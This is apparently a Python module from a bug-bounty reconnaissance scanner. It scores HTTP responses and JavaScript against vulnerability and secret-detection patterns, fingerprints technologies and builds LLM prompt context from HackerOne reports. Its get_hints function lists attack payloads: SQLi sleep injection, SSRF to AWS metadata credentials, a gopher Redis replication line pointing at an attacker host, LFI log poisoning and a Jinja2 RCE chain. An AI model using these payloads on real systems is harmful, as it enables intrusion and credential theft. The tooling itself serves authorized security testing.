"""
TheMasterRecon RAG Intelligence Engine v1.0
Integrates real bug bounty intelligence into the scanner AI.
Provides: pattern scoring, JS analysis, tech fingerprinting, RAG context building.
No external dependencies needed — all heuristics run offline.
With ANTHROPIC_API_KEY: adds LLM-enhanced analysis with real H1 report context.
"""
from __future__ import annotations
import hashlib, json, logging, os, re, time
from typing import Dict, Any, List, Optional

log = logging.getLogger("elite.rag")

# ── 27-rule pattern scoring engine ────────────────────────────────────────────
RULES = [
    ("xss_reflection","xss",  0.70, r'<script|onerror=|onload=|alert\(|confirm\(', "body"),
    ("xss_dom_sink",  "xss",  0.50, r'innerHTML|outerHTML|document\.write|eval\s*\(', "js"),
    ("xss_no_csp",    "xss",  0.25, None, "header_missing:content-security-policy"),
    ("sqli_error","sqli",0.90, r"you have an error in your sql|sql syntax|mysql_fetch|ORA-\d{5}|pg_query|SQLSTATE|unclosed quotation", "body"),
    ("sqli_time", "sqli",0.75, None, "timing:4.5"),
    ("sqli_param","sqli",0.30, r"[?&](?:id|user_id|uid|pid|search|q)=", "url"),
    ("ssrf_meta",  "ssrf",0.95, r'ami-id|instance-id|iam/security-credentials|computeMetadata|AccessKeyId|169\.254', "body"),
    ("ssrf_param", "ssrf",0.45, r"[?&](?:url|uri|link|src|host|endpoint|callback|redirect|fetch|proxy)=", "url"),
    ("ssrf_internal","ssrf",0.65,r'192\.168\.|10\.\d+\.|172\.(1[6-9]|2\d|3[01])\.|localhost|127\.0\.0\.1',"body"),
    ("idor_num",  "idor",0.40, r'/(?:user|account|profile|order|ticket|api)/\d+', "url"),
    ("idor_uuid", "idor",0.35, r'/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}', "url"),
    ("idor_param","idor",0.40, r"[?&](?:id|user_id|uid|account_id|profile_id|order_id)=\d+", "url"),
    ("lfi_param", "lfi", 0.55, r"[?&](?:file|path|page|template|include|load|view|lang|doc)=", "url"),
    ("lfi_confirm","lfi",0.98, r'root:x:0:0|root:/root:/bin|/bin/bash|boot\.ini', "body"),
    ("ssti_eval", "ssti",0.95, r'49', "body"),
    ("ssti_error","ssti",0.60, r'TemplateSyntaxError|UndefinedError|jinja2\.exceptions|Twig_Error', "body"),
    ("cors_reflect","cors",0.85,None, "cors_reflect"),
    ("cors_creds","cors",0.95, None, "header:access-control-allow-credentials:true"),
    ("info_stack","misconfig",0.80,r'Traceback \(most recent|at [\w\.]+\([\w]+\.java:\d+\)', "body"),
    ("info_config","misconfig",0.75,r'(DB_HOST|DB_PASSWORD|AWS_SECRET|API_KEY|SECRET_KEY)\s*[=:]\s*\S+', "body"),
    ("js_aws","misconfig",0.95, r'AKIA[0-9A-Z]{16}', "js"),
    ("js_key","misconfig",0.80, r'(?:api[_-]?key|apiKey)\s*[=:]\s*["\']([A-Za-z0-9_\-]{20,})["\']', "js"),
    ("js_jwt","misconfig",0.85, r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+', "js"),
    ("graphql","graphql",0.75, r'"__schema"|"__type"|introspectionQuery', "body"),
    ("redirect","redirect",0.50,r"[?&](?:redirect|return|next|url|goto|target)=(?:https?://|//)", "url"),
    ("proto_param","prototype",0.60,r'__proto__|constructor\.prototype', "url"),
    ("host_hdr","host_header",0.65,r'attacker\.com|evil\.com', "body"),
]

JS_SECRETS = [
    (r'(?:api[_-]?key|apiKey|API_KEY)\s*[=:]\s*["\']([A-Za-z0-9_\-]{20,})["\']', "API Key"),
    (r'(?:secret[_-]?key|SECRET_KEY)\s*[=:]\s*["\']([A-Za-z0-9_\-/+]{20,})["\']', "Secret Key"),
    (r'(?:password|passwd|PWD)\s*[=:]\s*["\']([^"\']{8,64})["\']', "Password"),
    (r'AKIA[0-9A-Z]{16}', "AWS Access Key"),
    (r'AIza[0-9A-Za-z\-_]{35}', "Google API Key"),
    (r'(?:mongodb|mysql|postgresql|redis)\+?://[^\s"\'<>]+', "Database URL"),
    (r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+', "JWT Token"),
    (r'-----BEGIN (?:RSA )?PRIVATE KEY-----', "Private Key"),
    (r'(?:slack_token|xox[baprs]-[A-Za-z0-9\-]+)', "Slack Token"),
    (r'(?:github[_-]?token|gh[_-]?token)\s*[=:]\s*["\']([A-Za-z0-9_]{20,})["\']', "GitHub Token"),
    (r'(?:stripe|sk_live|pk_live)[_-]?[A-Za-z0-9]{20,}', "Stripe Key"),
]

DOM_SINKS = [
    (r'innerHTML\s*=',           "innerHTML assignment - XSS risk"),
    (r'outerHTML\s*=',           "outerHTML assignment - XSS risk"),
    (r'document\.write\s*\(',   "document.write - XSS risk"),
    (r'eval\s*\(',               "eval() - code injection risk"),
    (r'window\.location\s*=',   "location assignment - redirect risk"),
    (r'location\.href\s*=',     "location.href - redirect risk"),
    (r'postMessage\s*\(',        "postMessage - cross-origin risk"),
    (r'insertAdjacentHTML\s*\(', "insertAdjacentHTML - XSS risk"),
]


def score_artifact(url="", body="", headers=None, js_content="", elapsed=0.0) -> Dict[str,Any]:
    """Score HTTP artifact against all pattern rules. Returns candidates + evidence."""
    headers = {k.lower(): v for k,v in (headers or {}).items()}
    vuln_scores: Dict[str,float] = {}
    evidence: List[str] = []

    for rule_id, vuln, weight, pattern, target in RULES:
        fired = False
        if target == "url" and pattern:
            fired = bool(re.search(pattern, url, re.I))
        elif target == "body" and pattern:
            fired = bool(re.search(pattern, body, re.I|re.M))
        elif target == "js" and pattern:
            fired = bool(re.search(pattern, js_content or body, re.I))
        elif target.startswith("header:"):
            parts = target.split(":", 2)
            hval  = headers.get(parts[1] if len(parts)>1 else "", "")
            fired = bool(hval and (len(parts)<3 or hval.lower()==parts[2].lower()))
        elif target.startswith("header_missing:"):
            fired = target.split(":",1)[1] not in headers
        elif target.startswith("timing:"):
            fired = elapsed >= float(target.split(":",1)[1])
        elif target == "cors_reflect":
            acao  = headers.get("access-control-allow-origin","")
            fired = bool(acao and acao not in ("*","null") and "." in acao)
        if fired:
            vuln_scores[vuln] = min(1.0, vuln_scores.get(vuln,0) + weight)
            evidence.append(f"[{rule_id}] {vuln.upper()} detected")

    top = sorted(vuln_scores.items(), key=lambda x:-x[1])
    return {
        "candidates":  [{"vuln":v,"score":round(s,3)} for v,s in top[:5]],
        "evidence":    evidence[:15],
        "top_vuln":    top[0][0] if top else None,
        "confidence":  round(min(0.95, sum(vuln_scores.values())/max(len(RULES)*0.12,1)), 3),
        "raw_scores":  {v:round(s,3) for v,s in top},
    }


def analyze_js(url: str, content: str) -> Dict[str,Any]:
    """Full JS security analysis: endpoints, sinks, secrets, frameworks."""
    endpoints: List[str] = []
    secrets:   List[Dict] = []
    sinks:     List[Dict] = []
    frameworks: List[str] = []

    EP_PATS = [
        r'fetch\(["\']([^"\'?#]{3,100})["\']',
        r'axios\.\w+\(["\']([^"\'?#]{3,100})["\']',
        r'url\s*[:=]\s*["\']([/][^"\'?#\s]{3,80})["\']',
        r'["\'](?:/api/[^"\'?#\s]{2,80})["\']',
    ]
    for pat in EP_PATS:
        for m in re.finditer(pat, content, re.I):
            try:
                ep = (m.group(1) if m.lastindex and m.lastindex>=1 else m.group(0)).strip()
                if ep and len(ep)>2 and "example" not in ep.lower():
                    endpoints.append(ep)
            except Exception:
                pass

    seen = set()
    for pat, stype in JS_SECRETS:
        for m in re.finditer(pat, content, re.I):
            val = m.group(0)[:150]
            h   = hashlib.md5(val.encode()).hexdigest()
            if h in seen or any(p in val.lower() for p in ["example","test","dummy","placeholder"]): continue
            seen.add(h)
            lineno = content[:m.start()].count("\n")+1
            sev    = "critical" if any(k in stype.lower() for k in ["aws","private","password","stripe"]) else "high"
            secrets.append({"type":stype,"value":val[:80],"line":lineno,"severity":sev})

    seen_descs = set()
    for pat, desc in DOM_SINKS:
        for m in re.finditer(pat, content, re.I):
            if desc in seen_descs: continue
            seen_descs.add(desc)
            lineno = content[:m.start()].count("\n")+1
            sinks.append({"sink":m.group(0)[:60],"description":desc,"line":lineno})

    FW = [(r'React\.|ReactDOM',"React"),(r'angular\.|@angular',"Angular"),
          (r'Vue\.|createApp\(',"Vue.js"),(r'__NEXT_DATA__',"Next.js"),
          (r'graphql|gql`',"GraphQL"),(r'//# sourceMappingURL=',"Source Map")]
    for pat, name in FW:
        if re.search(pat, content, re.I): frameworks.append(name)

    sm = re.search(r'//# sourceMappingURL=(\S+)', content)
    sm_url = sm.group(1) if sm else None

    notes = []
    if secrets:   notes.append(f"WARNING: {len(secrets)} secret(s) found - verify before reporting")
    if any("XSS" in s["description"] for s in sinks): notes.append("DOM XSS sinks detected - trace data flow from user input")
    if any("redirect" in s["description"].lower() for s in sinks): notes.append("Location/href assignment - check if user-controlled input reaches it")
    if endpoints:  notes.append(f"{len(endpoints)} API endpoints extracted - test for IDOR/auth issues")
    if sm_url:     notes.append(f"Source map at {sm_url} - fetch and analyze for hidden routes")

    return {
        "url": url, "endpoints_found": list(dict.fromkeys(endpoints))[:30],
        "secrets_found": secrets[:15], "dom_sinks": sinks[:10],
        "framework_hints": frameworks, "source_map_url": sm_url,
        "analyst_notes": notes,
    }


def fingerprint_tech(url="", headers=None, body="") -> Dict[str,Any]:
    """Detect tech stack from HTTP response headers and body."""
    headers = {k.lower():v for k,v in (headers or {}).items()}
    tech: Dict[str,float] = {}

    HEADER_SIGS = [
        ("x-powered-by",r"PHP/","PHP"),("x-powered-by",r"Express","Node.js/Express"),
        ("x-powered-by",r"ASP\.NET","ASP.NET"),("x-powered-by",r"Next\.js","Next.js"),
        ("server",r"nginx","Nginx"),("server",r"apache","Apache"),
        ("server",r"IIS","IIS"),("server",r"cloudflare","Cloudflare"),
        ("x-generator",r"WordPress","WordPress"),("cf-ray",r"","Cloudflare"),
        ("x-vercel-id",r"","Vercel"),("x-amz-request-id",r"","AWS"),
    ]
    for hname, pat, name in HEADER_SIGS:
        val = headers.get(hname,"")
        if val and (not pat or re.search(pat, val, re.I)):
            tech[name] = max(tech.get(name,0), 0.9)

    BODY_SIGS = [
        (r'wp-content/|wp-includes/',"WordPress"),(r'__NEXT_DATA__|_next/static/',"Next.js"),
        (r'window\.__NUXT__|/_nuxt/',"Nuxt.js"),(r'data-reactroot|ReactDOM',"React"),
        (r'ng-version=|angular\.min\.js',"Angular"),(r'swagger-ui|/api-docs',"OpenAPI"),
        (r'graphiql|__schema',"GraphQL"),(r'laravel.*csrf|csrf.*laravel',"Laravel"),
        (r'Traceback.*python|django\.core',"Django"),(r'ASP\.NET|__VIEWSTATE',"ASP.NET"),
        (r'firebase\.google\.com',"Firebase"),
    ]
    for pat, name in BODY_SIGS:
        if body and re.search(pat, body, re.I):
            tech[name] = max(tech.get(name,0), 0.85)

    waf = None
    server = headers.get("server","")
    for wn in ["cloudflare","akamai","aws-waf","fastly","sucuri","imperva"]:
        if wn in server.lower() or f"x-{wn[:5]}" in headers:
            waf = wn.title(); break

    tech_list = sorted(tech.items(), key=lambda x:-x[1])
    fws = ["React","Angular","Vue","Next","Nuxt","Django","Laravel","Spring","ASP.NET"]
    return {
        "technologies": [t for t,_ in tech_list],
        "frameworks":   [t for t,_ in tech_list if any(f in t for f in fws)],
        "waf": waf, "server": server,
        "confidence": round(sum(s for _,s in tech_list)/max(len(tech_list),1),3) if tech_list else 0.0,
    }


def build_rag_context(findings: List[Dict], tech: List[str], waf: str,
                       domain: str, endpoints_count: int) -> str:
    """
    Build enriched context injected into every AI message.
    This is the RAG layer: AI reasons from structured evidence, not guesses.
    """
    crits = [f for f in findings if f.get("severity")=="critical"]
    highs = [f for f in findings if f.get("severity")=="high"]
    vuln_families: Dict[str,int] = {}
    for f in findings:
        fam = _norm(f.get("bug","") or f.get("bug_type",""))
        vuln_families[fam] = vuln_families.get(fam,0)+1
    top_fams = sorted(vuln_families.items(), key=lambda x:-x[1])[:6]

    lines = [
        f"RAG SCAN INTEL: {domain}",
        f"Scope: {endpoints_count:,} endpoints | {len(findings)} findings ({len(crits)} crit, {len(highs)} high)",
        f"Tech: {', '.join(tech[:8]) or 'Unknown'} | WAF: {waf or 'none'}",
        f"Vuln families: {' | '.join(f'{c}x{v}' for v,c in top_fams)}",
    ]
    if crits or highs:
        lines.append("Top findings:")
        for f in (crits+highs)[:8]:
            bug  = (f.get("bug") or f.get("bug_type","?")).upper()
            url  = f.get("url","")[:70]
            conf = f.get("confidence",50)
            lines.append(f"  [{f.get('severity','?').upper()[:4]}] {bug} conf={conf}% @ {url}")
    # Include real similar reports from RAG DB if populated
    try:
        from engine.rag_db import stats as _rag_stats
        _s = _rag_stats()
        if _s.get("total_reports", 0) > 0:
            lines.append(f"RAG DB: {_s['total_reports']:,} reports indexed | {_s['embedded']:,} embedded")
            # Get top vuln family from findings
            _top_bug = ""
            if findings:
                _bug_counts: Dict[str, int] = {}
                for _f in findings:
                    _b = _norm(_f.get("bug","") or _f.get("bug_type",""))
                    _bug_counts[_b] = _bug_counts.get(_b, 0) + 1
                _top_bug = max(_bug_counts, key=_bug_counts.get, default="")
            if _top_bug:
                _similar = get_similar_reports(_top_bug, tech[0] if tech else "", top_k=3)
                if _similar:
                    lines.append(format_similar_for_prompt(_similar))
        else:
            lines.append("RAG DB: empty — run /rag/ingest to load H1 reports")
    except Exception:
        pass
    return "\n".join(lines)


def get_similar_reports(bug_type: str = "", tech: str = "",
                         query: str = "", top_k: int = 5) -> List[Dict[str, Any]]:
    """
    Search the RAG database for similar real H1 reports.
    Returns list of {title, url, bug_type, severity, program, score, body}.
    Falls back gracefully if DB not populated.
    """
    try:
        from engine.rag_db import search, stats
        s = stats()
        if s.get("total_reports", 0) == 0:
            return []
        q = query or f"{bug_type} vulnerability {tech}".strip()
        return search(q, top_k=top_k, bug_type=bug_type, tech=tech)
    except Exception as e:
        log.debug(f"[rag_intel] get_similar_reports: {e}")
        return []


def format_similar_for_prompt(reports: List[Dict[str, Any]]) -> str:
    """Format similar reports for injection into AI prompt."""
    if not reports:
        return ""
    lines = ["RAG SIMILAR CONFIRMED REPORTS:"]
    for r in reports[:5]:
        score   = r.get("score", 0)
        title   = r.get("title","")[:80]
        bug     = r.get("bug_type","?").upper()
        sev     = r.get("severity","?")
        prog    = r.get("program","?")
        url     = r.get("url","")[:80]
        lines.append(f"  [{score:.2f}] [{bug}] [{sev.upper()}] {title}")
        if prog: lines.append(f"         Program: {prog}")
        lines.append(f"         {url}")
        # Pull first 150 chars of body as context
        body = (r.get("body","") or "")[:150].replace("\n"," ").strip()
        if body: lines.append(f"         Preview: {body}…")
    return "\n".join(lines)


def get_hints(bug_type: str, tech: List[str]) -> List[str]:
    """Return expert hints for this bug+tech combo."""
    tech_lower = " ".join(t.lower() for t in tech)
    KNOWLEDGE = {
        "xss":  ["XSS via search param: test ?q= and ?search= — common in PHP/WordPress",
                 "Stored XSS in user profile -> admin session hijack chain",
                 "XSS + CSRF: use payload to auto-submit CSRF-protected form for ATO"],
        "sqli": ["Time-based blind: AND SLEEP(5) in MySQL, AND 1=CONVERT(int,@@version) in MSSQL",
                 "SQLi in JSON body: {'id':'1 OR 1=1'} — bypasses many WAFs",
                 "Error-based: single quote triggers verbose MySQL/MSSQL error messages"],
        "ssrf": ["AWS IMDS: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                 "Blind SSRF: confirm with OOB DNS callback before reporting",
                 "SSRF->Redis->RCE: gopher://localhost:6379/_SLAVEOF attacker 6379"],
        "idor": ["Increment/decrement numeric ID: access other users data without auth",
                 "UUID IDOR: create two accounts, swap UUID in API path",
                 "IDOR->privilege escalation: access admin endpoint with regular user ID"],
        "cors": ["CORS+ACAC=true+ACAO=reflected: chain with sensitive API endpoint for ATO",
                 "Null origin bypass: Origin: null triggers some misconfigs",
                 "CORS on /api/user/profile + XSS = account takeover"],
        "lfi":  ["php://filter/convert.base64-encode/resource=.env — read secrets without errors",
                 "LFI->RCE: inject PHP in User-Agent, include /var/log/apache2/access.log",
                 "LFI to /proc/self/environ for env var disclosure"],
        "ssti": ["Detection: {{7*7}}=49 Jinja2, ${7*7} FreeMarker, *{7*7} Spring",
                 "Jinja2 RCE: {{''.__class__.__mro__[1].__subclasses__()}} for gadget chain",
                 "SSTI in email templates and PDF generators often goes untested"],
    }
    fam = _norm(bug_type)
    hints = []
    if "wordpress" in tech_lower and fam=="xss": hints.append("WordPress: test comment fields and user bio for stored XSS")
    if "graphql" in tech_lower: hints.append("GraphQL: send introspection query first to map all types")
    if "aws" in tech_lower and fam=="ssrf": hints.append("AWS: SSRF to IMDS for IAM credentials is critical")
    if "php" in tech_lower and fam=="lfi": hints.append("PHP: test php://filter wrappers and expect:// wrapper")
    hints.extend(KNOWLEDGE.get(fam, [f"Test {bug_type.upper()} on all input vectors systematically"])[:3])
    return hints[:5]


def _norm(bug: str) -> str:
    b = bug.lower()
    for f in ["xss","sqli","ssrf","lfi","ssti","idor","cors","jwt","oauth","rce","xxe","graphql","redirect","misconfig","takeover","prototype"]:
        if f in b: return f
    return b[:12] or "other"
